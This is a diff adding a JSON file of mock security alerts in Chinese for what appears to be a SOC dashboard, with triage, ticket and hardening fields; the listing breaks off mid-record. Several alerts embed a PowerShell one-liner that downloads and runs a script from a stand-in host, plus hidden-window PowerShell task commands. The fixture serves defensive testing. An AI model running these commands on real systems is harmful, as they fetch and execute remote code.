@@ -1,0 +1,4152 @@
+[
+  {
+    "id": "ALT-2026-0001",
+    "title": "PowerShell 下载执行异常 #1",
+    "source": "wazuh",
+    "severity": "critical",
+    "status": "resolved",
+    "timestamp": "2026-04-14T09:00:00",
+    "rule_name": "WIN-Powershell-EncodedCommand",
+    "description": "终端主机检测到 PowerShell 使用编码参数从外部地址下载并执行脚本。",
+    "log_excerpt": "powershell.exe -EncodedCommand JABXAGM... IEX(New-Object Net.WebClient).DownloadString('http://cdn-shadow.example/a.ps1')",
+    "source_ip": "100.20.10.5",
+    "destination_ip": "10.0.0.30",
+    "source_geo": {
+      "region": "华北",
+      "country": "中国",
+      "city": "北京",
+      "latitude": 39.9042,
+      "longitude": 116.4074
+    },
+    "event_type": "恶意文件",
+    "request_content": "POST /sync/agent HTTP/1.1\nHost: cdn-shadow.example\nUser-Agent: powershell/7.4\nContent-Type: application/octet-stream\nX-Task: bootstrap",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/sync/agent",
+      "source_port": 49822,
+      "destination_port": 443,
+      "packet_size": 2846,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "0000  50 53 31 3a 20 49 45 58 28 4e 65 77 2d 4f 62 6a\n0010  65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Execution",
+    "related_rule_ids": [
+      "RULE-001",
+      "RULE-003"
+    ],
+    "hardening_suggestions": [
+      "限制 PowerShell 编码命令执行",
+      "启用 AppLocker 或 WDAC 白名单",
+      "对主机出站流量增加域名信誉校验"
+    ],
+    "similar_incidents": {
+      "total": 8,
+      "last_7_days": 2,
+      "closed_rate": 0.52
+    },
+    "ticket": {
+      "status": "pending",
+      "assignee": "张晨",
+      "updated_at": "2026-04-14T09:25:00",
+      "response_minutes": 8
+    },
+    "mitre_tactics": [
+      "Execution",
+      "Command and Control"
+    ],
+    "asset": {
+      "hostname": "asset-01",
+      "ip": "10.0.0.30",
+      "owner": "安全运营中心",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "svc-patch",
+      "host-win-01",
+      "cdn-shadow.example"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T08:48:00",
+        "message": "PowerShell 进程启动"
+      },
+      {
+        "timestamp": "2026-04-14T08:56:00",
+        "message": "发起外联下载"
+      },
+      {
+        "timestamp": "2026-04-14T09:00:00",
+        "message": "疑似脚本落地执行"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0002",
+    "title": "SSH 暴力破解尝试 #2",
+    "source": "suricata",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-14T08:43:00",
+    "rule_name": "LINUX-SSH-Bruteforce",
+    "description": "边界流量中检测到单个源地址在短时间内对多台 Linux 主机进行高频口令尝试。",
+    "log_excerpt": "sshd[2291]: Failed password for admin from 185.233.44.12 port 53118 ssh2",
+    "source_ip": "185.233.44.12",
+    "destination_ip": "10.0.2.15",
+    "source_geo": {
+      "region": "华东",
+      "country": "中国",
+      "city": "上海",
+      "latitude": 31.2304,
+      "longitude": 121.4737
+    },
+    "event_type": "暴力破解",
+    "request_content": "SSH auth attempt -> user=admin, auth_method=password, retries=16, target=bastion-02",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "AUTH",
+      "request_uri": "ssh://bastion-02:22",
+      "source_port": 53119,
+      "destination_port": 22,
+      "packet_size": 949,
+      "tcp_flags": "SYN,ACK",
+      "payload_preview": "SSH-2.0-OpenSSH_8.9\nKey exchange init\nUser auth request: admin/password"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-002",
+      "RULE-004"
+    ],
+    "hardening_suggestions": [
+      "启用 MFA 并关闭密码直连",
+      "对 SSH 开启来源白名单",
+      "将高频失败源加入临时封禁策略"
+    ],
+    "similar_incidents": {
+      "total": 9,
+      "last_7_days": 3,
+      "closed_rate": 0.6
+    },
+    "ticket": {
+      "status": "processing",
+      "assignee": "李岳",
+      "updated_at": "2026-04-14T09:08:00",
+      "response_minutes": 14
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Initial Access"
+    ],
+    "asset": {
+      "hostname": "asset-02",
+      "ip": "10.0.2.15",
+      "owner": "研发一部",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "admin",
+      "bastion-02",
+      "185.233.44.12"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T08:31:00",
+        "message": "首次失败登录"
+      },
+      {
+        "timestamp": "2026-04-14T08:39:00",
+        "message": "触发账号锁定阈值"
+      },
+      {
+        "timestamp": "2026-04-14T08:43:00",
+        "message": "同源继续尝试其他主机"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0003",
+    "title": "异常大流量数据外传 #3",
+    "source": "elk",
+    "severity": "critical",
+    "status": "new",
+    "timestamp": "2026-04-14T08:26:00",
+    "rule_name": "NET-Abnormal-Exfiltration",
+    "description": "财务系统服务器在非办公时间向陌生云存储地址持续上传压缩文件。",
+    "log_excerpt": "TLS upload session to report-archive node, stream chunks=248, compressed=true, bytes=184923410",
+    "source_ip": "45.83.91.201",
+    "destination_ip": "10.0.5.22",
+    "source_geo": {
+      "region": "华南",
+      "country": "中国",
+      "city": "深圳",
+      "latitude": 22.5431,
+      "longitude": 114.0579
+    },
+    "event_type": "可疑外连",
+    "request_content": "PUT /archive/2026/q2/report-pack-14.tar.gz HTTP/1.1\nHost: report-archive.example\nContent-Length: 184923410\nX-Transfer-Mode: bulk-sync",
+    "packet_details": {
+      "protocol": "TLS",
+      "request_method": "PUT",
+      "request_uri": "/archive/2026/q2/report-pack-14.tar.gz",
+      "source_port": 51746,
+      "destination_port": 443,
+      "packet_size": 4170,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "1f 8b 08 00 00 00 00 00 02 ff ec bd 79 7c 14 c5 ..."
+    },
+    "threat_type": "exfiltration",
+    "attack_stage": "Exfiltration",
+    "related_rule_ids": [
+      "RULE-003",
+      "RULE-005"
+    ],
+    "hardening_suggestions": [
+      "限制敏感服务器对外上传目的地",
+      "为数据出口启用 DLP 审计",
+      "对非业务时段大流量传输设置自动阻断"
+    ],
+    "similar_incidents": {
+      "total": 10,
+      "last_7_days": 4,
+      "closed_rate": 0.68
+    },
+    "ticket": {
+      "status": "closed",
+      "assignee": "王琪",
+      "updated_at": "2026-04-14T08:51:00",
+      "response_minutes": 20
+    },
+    "mitre_tactics": [
+      "Collection",
+      "Exfiltration"
+    ],
+    "asset": {
+      "hostname": "asset-03",
+      "ip": "10.0.5.22",
+      "owner": "财务系统组",
+      "environment": "test"
+    },
+    "related_entities": [
+      "finance-app-01",
+      "report-archive",
+      "s3-transfer-gw"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T08:14:00",
+        "message": "检测到异常上传连接"
+      },
+      {
+        "timestamp": "2026-04-14T08:22:00",
+        "message": "传输体积快速上升"
+      },
+      {
+        "timestamp": "2026-04-14T08:26:00",
+        "message": "命中夜间传输告警阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0004",
+    "title": "计划任务横向下发异常 #4",
+    "source": "wazuh",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-14T08:09:00",
+    "rule_name": "WIN-Remote-Task-Creation",
+    "description": "域内管理主机对多台终端批量创建计划任务，任务内容与标准运维基线不一致。",
+    "log_excerpt": "Remote task creation RPC request -> task=update, schedule=minute, user=svc-backup, cmd=powershell.exe -w hidden",
+    "source_ip": "62.171.173.40",
+    "destination_ip": "10.0.8.90",
+    "source_geo": {
+      "region": "北美",
+      "country": "美国",
+      "city": "洛杉矶",
+      "latitude": 34.0522,
+      "longitude": -118.2437
+    },
+    "event_type": "漏洞利用",
+    "request_content": "RPC Task Scheduler CreateTask -> target=ws-224, action=powershell.exe -w hidden -nop -c Invoke-WebRequest",
+    "packet_details": {
+      "protocol": "RPC",
+      "request_method": "CreateTask",
+      "request_uri": "rpc://ws-224/tasks",
+      "source_port": 49891,
+      "destination_port": 445,
+      "packet_size": 1647,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "TaskName=WindowsUpdateCheck\nTrigger=Minute/1\nAction=powershell.exe -w hidden -nop"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Command and Control",
+    "related_rule_ids": [
+      "RULE-004",
+      "RULE-006"
+    ],
+    "hardening_suggestions": [
+      "收敛远程任务创建权限",
+      "审计高权限服务账号使用轨迹",
+      "对隐藏窗口 PowerShell 命令设置拦截规则"
+    ],
+    "similar_incidents": {
+      "total": 11,
+      "last_7_days": 5,
+      "closed_rate": 0.76
+    },
+    "ticket": {
+      "status": "ignored",
+      "assignee": "SOC值班",
+      "updated_at": "2026-04-14T08:34:00",
+      "response_minutes": 26
+    },
+    "mitre_tactics": [
+      "Lateral Movement",
+      "Persistence"
+    ],
+    "asset": {
+      "hostname": "asset-04",
+      "ip": "10.0.8.90",
+      "owner": "基础设施组",
+      "environment": "dev"
+    },
+    "related_entities": [
+      "svc-backup",
+      "ops-jump-01",
+      "ws-224"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T07:57:00",
+        "message": "检测到远程计划任务下发"
+      },
+      {
+        "timestamp": "2026-04-14T08:05:00",
+        "message": "任务命令与基线不符"
+      },
+      {
+        "timestamp": "2026-04-14T08:09:00",
+        "message": "受影响终端数量持续增加"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0005",
+    "title": "端口扫描探测 #5",
+    "source": "suricata",
+    "severity": "medium",
+    "status": "new",
+    "timestamp": "2026-04-14T07:52:00",
+    "rule_name": "NET-Port-Scan-Fanout",
+    "description": "单个外部地址对内网多个网段进行快速端口枚举，覆盖常见管理端口。",
+    "log_excerpt": "TCP SYN burst to subnet 10.0.5.0/24 over 22,80,443,3389, fanout=28",
+    "source_ip": "203.55.18.91",
+    "destination_ip": "10.1.1.18",
+    "source_geo": {
+      "region": "欧洲",
+      "country": "德国",
+      "city": "法兰克福",
+      "latitude": 50.1109,
+      "longitude": 8.6821
+    },
+    "event_type": "端口扫描",
+    "request_content": "TCP SYN scan burst detected against 10.0.5.0/24 ports 22,80,443,3389",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "SYN",
+      "request_uri": "scan://10.0.5.0/24",
+      "source_port": 42121,
+      "destination_port": 3389,
+      "packet_size": 276,
+      "tcp_flags": "SYN",
+      "payload_preview": "No payload. Repeated SYN packets with incremental destination port fanout."
+    },
+    "threat_type": "port-scan",
+    "attack_stage": "Reconnaissance",
+    "related_rule_ids": [
+      "RULE-005",
+      "RULE-001"
+    ],
+    "hardening_suggestions": [
+      "在边界启用扫描速率限制",
+      "将非常见来源纳入威胁情报封禁",
+      "对暴露服务进行最小化开放"
+    ],
+    "similar_incidents": {
+      "total": 12,
+      "last_7_days": 2,
+      "closed_rate": 0.84
+    },
+    "ticket": {
+      "status": "pending",
+      "assignee": "蓝队一组",
+      "updated_at": "2026-04-14T08:17:00",
+      "response_minutes": 32
+    },
+    "mitre_tactics": [
+      "Reconnaissance",
+      "Discovery"
+    ],
+    "asset": {
+      "hostname": "asset-05",
+      "ip": "10.1.1.18",
+      "owner": "数据平台组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "scanner-node",
+      "edge-fw-01",
+      "10.0.5.0/24"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T07:40:00",
+        "message": "扫描开始"
+      },
+      {
+        "timestamp": "2026-04-14T07:48:00",
+        "message": "端口覆盖范围扩大"
+      },
+      {
+        "timestamp": "2026-04-14T07:52:00",
+        "message": "频率达到封禁阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0006",
+    "title": "异常登录地理偏移 #6",
+    "source": "elk",
+    "severity": "medium",
+    "status": "resolved",
+    "timestamp": "2026-04-14T07:35:00",
+    "rule_name": "IAM-Improbable-Travel",
+    "description": "同一账号在 20 分钟内先后出现在两个地理位置差异较大的登录事件中。",
+    "log_excerpt": "Account sign-in from Singapore then Frankfurt within 20 minutes for user zhangsan",
+    "source_ip": "198.51.100.22",
+    "destination_ip": "172.16.4.20",
+    "source_geo": {
+      "region": "东南亚",
+      "country": "新加坡",
+      "city": "新加坡",
+      "latitude": 1.3521,
+      "longitude": 103.8198
+    },
+    "event_type": "异常登录",
+    "request_content": "POST /api/auth/signin HTTP/1.1\nHost: sso.example\nX-Geo: Frankfurt\nX-User: zhangsan",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/api/auth/signin",
+      "source_port": 50219,
+      "destination_port": 443,
+      "packet_size": 1210,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "username=zhangsan&grant_type=password&device=unknown-browser"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-006",
+      "RULE-002"
+    ],
+    "hardening_suggestions": [
+      "对高风险登录强制二次校验",
+      "梳理账号共享与代维场景",
+      "针对异地登录启用条件访问策略"
+    ],
+    "similar_incidents": {
+      "total": 13,
+      "last_7_days": 3,
+      "closed_rate": 0.52
+    },
+    "ticket": {
+      "status": "processing",
+      "assignee": "张晨",
+      "updated_at": "2026-04-14T08:00:00",
+      "response_minutes": 38
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Valid Accounts"
+    ],
+    "asset": {
+      "hostname": "asset-06",
+      "ip": "172.16.4.20",
+      "owner": "安全运营中心",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "zhangsan",
+      "vpn-gateway",
+      "m365-portal"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T07:23:00",
+        "message": "新加坡登录成功"
+      },
+      {
+        "timestamp": "2026-04-14T07:31:00",
+        "message": "法兰克福登录出现"
+      },
+      {
+        "timestamp": "2026-04-14T07:35:00",
+        "message": "触发异地登录规则"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0007",
+    "title": "PowerShell 下载执行异常 #7",
+    "source": "wazuh",
+    "severity": "critical",
+    "status": "new",
+    "timestamp": "2026-04-14T07:18:00",
+    "rule_name": "WIN-Powershell-EncodedCommand",
+    "description": "终端主机检测到 PowerShell 使用编码参数从外部地址下载并执行脚本。",
+    "log_excerpt": "powershell.exe -EncodedCommand JABXAGM... IEX(New-Object Net.WebClient).DownloadString('http://cdn-shadow.example/a.ps1')",
+    "source_ip": "91.214.124.75",
+    "destination_ip": "10.0.0.30",
+    "source_geo": {
+      "region": "东亚",
+      "country": "日本",
+      "city": "东京",
+      "latitude": 35.6762,
+      "longitude": 139.6503
+    },
+    "event_type": "恶意文件",
+    "request_content": "POST /sync/agent HTTP/1.1\nHost: cdn-shadow.example\nUser-Agent: powershell/7.4\nContent-Type: application/octet-stream\nX-Task: bootstrap",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/sync/agent",
+      "source_port": 49828,
+      "destination_port": 443,
+      "packet_size": 2883,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "0000  50 53 31 3a 20 49 45 58 28 4e 65 77 2d 4f 62 6a\n0010  65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Execution",
+    "related_rule_ids": [
+      "RULE-001",
+      "RULE-003"
+    ],
+    "hardening_suggestions": [
+      "限制 PowerShell 编码命令执行",
+      "启用 AppLocker 或 WDAC 白名单",
+      "对主机出站流量增加域名信誉校验"
+    ],
+    "similar_incidents": {
+      "total": 14,
+      "last_7_days": 4,
+      "closed_rate": 0.6
+    },
+    "ticket": {
+      "status": "closed",
+      "assignee": "李岳",
+      "updated_at": "2026-04-14T07:43:00",
+      "response_minutes": 44
+    },
+    "mitre_tactics": [
+      "Execution",
+      "Command and Control"
+    ],
+    "asset": {
+      "hostname": "asset-07",
+      "ip": "10.0.0.30",
+      "owner": "研发一部",
+      "environment": "test"
+    },
+    "related_entities": [
+      "svc-patch",
+      "host-win-01",
+      "cdn-shadow.example"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T07:06:00",
+        "message": "PowerShell 进程启动"
+      },
+      {
+        "timestamp": "2026-04-14T07:14:00",
+        "message": "发起外联下载"
+      },
+      {
+        "timestamp": "2026-04-14T07:18:00",
+        "message": "疑似脚本落地执行"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0008",
+    "title": "SSH 暴力破解尝试 #8",
+    "source": "suricata",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-14T07:01:00",
+    "rule_name": "LINUX-SSH-Bruteforce",
+    "description": "边界流量中检测到单个源地址在短时间内对多台 Linux 主机进行高频口令尝试。",
+    "log_excerpt": "sshd[2291]: Failed password for admin from 185.233.44.12 port 53118 ssh2",
+    "source_ip": "103.77.182.16",
+    "destination_ip": "10.0.2.15",
+    "source_geo": {
+      "region": "东欧",
+      "country": "俄罗斯",
+      "city": "莫斯科",
+      "latitude": 55.7558,
+      "longitude": 37.6173
+    },
+    "event_type": "暴力破解",
+    "request_content": "SSH auth attempt -> user=admin, auth_method=password, retries=16, target=bastion-02",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "AUTH",
+      "request_uri": "ssh://bastion-02:22",
+      "source_port": 53125,
+      "destination_port": 22,
+      "packet_size": 986,
+      "tcp_flags": "SYN,ACK",
+      "payload_preview": "SSH-2.0-OpenSSH_8.9\nKey exchange init\nUser auth request: admin/password"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-002",
+      "RULE-004"
+    ],
+    "hardening_suggestions": [
+      "启用 MFA 并关闭密码直连",
+      "对 SSH 开启来源白名单",
+      "将高频失败源加入临时封禁策略"
+    ],
+    "similar_incidents": {
+      "total": 15,
+      "last_7_days": 5,
+      "closed_rate": 0.68
+    },
+    "ticket": {
+      "status": "ignored",
+      "assignee": "王琪",
+      "updated_at": "2026-04-14T07:26:00",
+      "response_minutes": 50
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Initial Access"
+    ],
+    "asset": {
+      "hostname": "asset-08",
+      "ip": "10.0.2.15",
+      "owner": "财务系统组",
+      "environment": "dev"
+    },
+    "related_entities": [
+      "admin",
+      "bastion-02",
+      "185.233.44.12"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T06:49:00",
+        "message": "首次失败登录"
+      },
+      {
+        "timestamp": "2026-04-14T06:57:00",
+        "message": "触发账号锁定阈值"
+      },
+      {
+        "timestamp": "2026-04-14T07:01:00",
+        "message": "同源继续尝试其他主机"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0009",
+    "title": "异常大流量数据外传 #9",
+    "source": "elk",
+    "severity": "critical",
+    "status": "new",
+    "timestamp": "2026-04-14T06:44:00",
+    "rule_name": "NET-Abnormal-Exfiltration",
+    "description": "财务系统服务器在非办公时间向陌生云存储地址持续上传压缩文件。",
+    "log_excerpt": "TLS upload session to report-archive node, stream chunks=248, compressed=true, bytes=184923410",
+    "source_ip": "176.65.148.211",
+    "destination_ip": "10.0.5.22",
+    "source_geo": {
+      "region": "南亚",
+      "country": "印度",
+      "city": "孟买",
+      "latitude": 19.076,
+      "longitude": 72.8777
+    },
+    "event_type": "可疑外连",
+    "request_content": "PUT /archive/2026/q2/report-pack-14.tar.gz HTTP/1.1\nHost: report-archive.example\nContent-Length: 184923410\nX-Transfer-Mode: bulk-sync",
+    "packet_details": {
+      "protocol": "TLS",
+      "request_method": "PUT",
+      "request_uri": "/archive/2026/q2/report-pack-14.tar.gz",
+      "source_port": 51752,
+      "destination_port": 443,
+      "packet_size": 4207,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "1f 8b 08 00 00 00 00 00 02 ff ec bd 79 7c 14 c5 ..."
+    },
+    "threat_type": "exfiltration",
+    "attack_stage": "Exfiltration",
+    "related_rule_ids": [
+      "RULE-003",
+      "RULE-005"
+    ],
+    "hardening_suggestions": [
+      "限制敏感服务器对外上传目的地",
+      "为数据出口启用 DLP 审计",
+      "对非业务时段大流量传输设置自动阻断"
+    ],
+    "similar_incidents": {
+      "total": 16,
+      "last_7_days": 2,
+      "closed_rate": 0.76
+    },
+    "ticket": {
+      "status": "pending",
+      "assignee": "SOC值班",
+      "updated_at": "2026-04-14T07:09:00",
+      "response_minutes": 56
+    },
+    "mitre_tactics": [
+      "Collection",
+      "Exfiltration"
+    ],
+    "asset": {
+      "hostname": "asset-09",
+      "ip": "10.0.5.22",
+      "owner": "基础设施组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "finance-app-01",
+      "report-archive",
+      "s3-transfer-gw"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T06:32:00",
+        "message": "检测到异常上传连接"
+      },
+      {
+        "timestamp": "2026-04-14T06:40:00",
+        "message": "传输体积快速上升"
+      },
+      {
+        "timestamp": "2026-04-14T06:44:00",
+        "message": "命中夜间传输告警阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0010",
+    "title": "计划任务横向下发异常 #10",
+    "source": "wazuh",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-14T06:27:00",
+    "rule_name": "WIN-Remote-Task-Creation",
+    "description": "域内管理主机对多台终端批量创建计划任务，任务内容与标准运维基线不一致。",
+    "log_excerpt": "Remote task creation RPC request -> task=update, schedule=minute, user=svc-backup, cmd=powershell.exe -w hidden",
+    "source_ip": "45.142.214.8",
+    "destination_ip": "10.0.8.90",
+    "source_geo": {
+      "region": "南美",
+      "country": "巴西",
+      "city": "圣保罗",
+      "latitude": -23.5505,
+      "longitude": -46.6333
+    },
+    "event_type": "漏洞利用",
+    "request_content": "RPC Task Scheduler CreateTask -> target=ws-224, action=powershell.exe -w hidden -nop -c Invoke-WebRequest",
+    "packet_details": {
+      "protocol": "RPC",
+      "request_method": "CreateTask",
+      "request_uri": "rpc://ws-224/tasks",
+      "source_port": 49897,
+      "destination_port": 445,
+      "packet_size": 1684,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "TaskName=WindowsUpdateCheck\nTrigger=Minute/1\nAction=powershell.exe -w hidden -nop"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Command and Control",
+    "related_rule_ids": [
+      "RULE-004",
+      "RULE-006"
+    ],
+    "hardening_suggestions": [
+      "收敛远程任务创建权限",
+      "审计高权限服务账号使用轨迹",
+      "对隐藏窗口 PowerShell 命令设置拦截规则"
+    ],
+    "similar_incidents": {
+      "total": 8,
+      "last_7_days": 3,
+      "closed_rate": 0.84
+    },
+    "ticket": {
+      "status": "processing",
+      "assignee": "蓝队一组",
+      "updated_at": "2026-04-14T06:52:00",
+      "response_minutes": 62
+    },
+    "mitre_tactics": [
+      "Lateral Movement",
+      "Persistence"
+    ],
+    "asset": {
+      "hostname": "asset-10",
+      "ip": "10.0.8.90",
+      "owner": "数据平台组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "svc-backup",
+      "ops-jump-01",
+      "ws-224"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T06:15:00",
+        "message": "检测到远程计划任务下发"
+      },
+      {
+        "timestamp": "2026-04-14T06:23:00",
+        "message": "任务命令与基线不符"
+      },
+      {
+        "timestamp": "2026-04-14T06:27:00",
+        "message": "受影响终端数量持续增加"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0011",
+    "title": "端口扫描探测 #11",
+    "source": "suricata",
+    "severity": "medium",
+    "status": "new",
+    "timestamp": "2026-04-14T06:10:00",
+    "rule_name": "NET-Port-Scan-Fanout",
+    "description": "单个外部地址对内网多个网段进行快速端口枚举，覆盖常见管理端口。",
+    "log_excerpt": "TCP SYN burst to subnet 10.0.5.0/24 over 22,80,443,3389, fanout=28",
+    "source_ip": "100.20.10.5",
+    "destination_ip": "10.1.1.18",
+    "source_geo": {
+      "region": "华北",
+      "country": "中国",
+      "city": "北京",
+      "latitude": 39.9042,
+      "longitude": 116.4074
+    },
+    "event_type": "端口扫描",
+    "request_content": "TCP SYN scan burst detected against 10.0.5.0/24 ports 22,80,443,3389",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "SYN",
+      "request_uri": "scan://10.0.5.0/24",
+      "source_port": 42127,
+      "destination_port": 3389,
+      "packet_size": 128,
+      "tcp_flags": "SYN",
+      "payload_preview": "No payload. Repeated SYN packets with incremental destination port fanout."
+    },
+    "threat_type": "port-scan",
+    "attack_stage": "Reconnaissance",
+    "related_rule_ids": [
+      "RULE-005",
+      "RULE-001"
+    ],
+    "hardening_suggestions": [
+      "在边界启用扫描速率限制",
+      "将非常见来源纳入威胁情报封禁",
+      "对暴露服务进行最小化开放"
+    ],
+    "similar_incidents": {
+      "total": 9,
+      "last_7_days": 4,
+      "closed_rate": 0.52
+    },
+    "ticket": {
+      "status": "closed",
+      "assignee": "张晨",
+      "updated_at": "2026-04-14T06:35:00",
+      "response_minutes": 8
+    },
+    "mitre_tactics": [
+      "Reconnaissance",
+      "Discovery"
+    ],
+    "asset": {
+      "hostname": "asset-11",
+      "ip": "10.1.1.18",
+      "owner": "安全运营中心",
+      "environment": "test"
+    },
+    "related_entities": [
+      "scanner-node",
+      "edge-fw-01",
+      "10.0.5.0/24"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T05:58:00",
+        "message": "扫描开始"
+      },
+      {
+        "timestamp": "2026-04-14T06:06:00",
+        "message": "端口覆盖范围扩大"
+      },
+      {
+        "timestamp": "2026-04-14T06:10:00",
+        "message": "频率达到封禁阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0012",
+    "title": "异常登录地理偏移 #12",
+    "source": "elk",
+    "severity": "medium",
+    "status": "resolved",
+    "timestamp": "2026-04-14T05:53:00",
+    "rule_name": "IAM-Improbable-Travel",
+    "description": "同一账号在 20 分钟内先后出现在两个地理位置差异较大的登录事件中。",
+    "log_excerpt": "Account sign-in from Singapore then Frankfurt within 20 minutes for user zhangsan",
+    "source_ip": "185.233.44.12",
+    "destination_ip": "172.16.4.20",
+    "source_geo": {
+      "region": "华东",
+      "country": "中国",
+      "city": "上海",
+      "latitude": 31.2304,
+      "longitude": 121.4737
+    },
+    "event_type": "异常登录",
+    "request_content": "POST /api/auth/signin HTTP/1.1\nHost: sso.example\nX-Geo: Frankfurt\nX-User: zhangsan",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/api/auth/signin",
+      "source_port": 50225,
+      "destination_port": 443,
+      "packet_size": 1247,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "username=zhangsan&grant_type=password&device=unknown-browser"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-006",
+      "RULE-002"
+    ],
+    "hardening_suggestions": [
+      "对高风险登录强制二次校验",
+      "梳理账号共享与代维场景",
+      "针对异地登录启用条件访问策略"
+    ],
+    "similar_incidents": {
+      "total": 10,
+      "last_7_days": 5,
+      "closed_rate": 0.6
+    },
+    "ticket": {
+      "status": "ignored",
+      "assignee": "李岳",
+      "updated_at": "2026-04-14T06:18:00",
+      "response_minutes": 14
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Valid Accounts"
+    ],
+    "asset": {
+      "hostname": "asset-12",
+      "ip": "172.16.4.20",
+      "owner": "研发一部",
+      "environment": "dev"
+    },
+    "related_entities": [
+      "zhangsan",
+      "vpn-gateway",
+      "m365-portal"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T05:41:00",
+        "message": "新加坡登录成功"
+      },
+      {
+        "timestamp": "2026-04-14T05:49:00",
+        "message": "法兰克福登录出现"
+      },
+      {
+        "timestamp": "2026-04-14T05:53:00",
+        "message": "触发异地登录规则"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0013",
+    "title": "PowerShell 下载执行异常 #13",
+    "source": "wazuh",
+    "severity": "critical",
+    "status": "new",
+    "timestamp": "2026-04-14T05:36:00",
+    "rule_name": "WIN-Powershell-EncodedCommand",
+    "description": "终端主机检测到 PowerShell 使用编码参数从外部地址下载并执行脚本。",
+    "log_excerpt": "powershell.exe -EncodedCommand JABXAGM... IEX(New-Object Net.WebClient).DownloadString('http://cdn-shadow.example/a.ps1')",
+    "source_ip": "45.83.91.201",
+    "destination_ip": "10.0.0.30",
+    "source_geo": {
+      "region": "华南",
+      "country": "中国",
+      "city": "深圳",
+      "latitude": 22.5431,
+      "longitude": 114.0579
+    },
+    "event_type": "恶意文件",
+    "request_content": "POST /sync/agent HTTP/1.1\nHost: cdn-shadow.example\nUser-Agent: powershell/7.4\nContent-Type: application/octet-stream\nX-Task: bootstrap",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/sync/agent",
+      "source_port": 49834,
+      "destination_port": 443,
+      "packet_size": 2920,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "0000  50 53 31 3a 20 49 45 58 28 4e 65 77 2d 4f 62 6a\n0010  65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Execution",
+    "related_rule_ids": [
+      "RULE-001",
+      "RULE-003"
+    ],
+    "hardening_suggestions": [
+      "限制 PowerShell 编码命令执行",
+      "启用 AppLocker 或 WDAC 白名单",
+      "对主机出站流量增加域名信誉校验"
+    ],
+    "similar_incidents": {
+      "total": 11,
+      "last_7_days": 2,
+      "closed_rate": 0.68
+    },
+    "ticket": {
+      "status": "pending",
+      "assignee": "王琪",
+      "updated_at": "2026-04-14T06:01:00",
+      "response_minutes": 20
+    },
+    "mitre_tactics": [
+      "Execution",
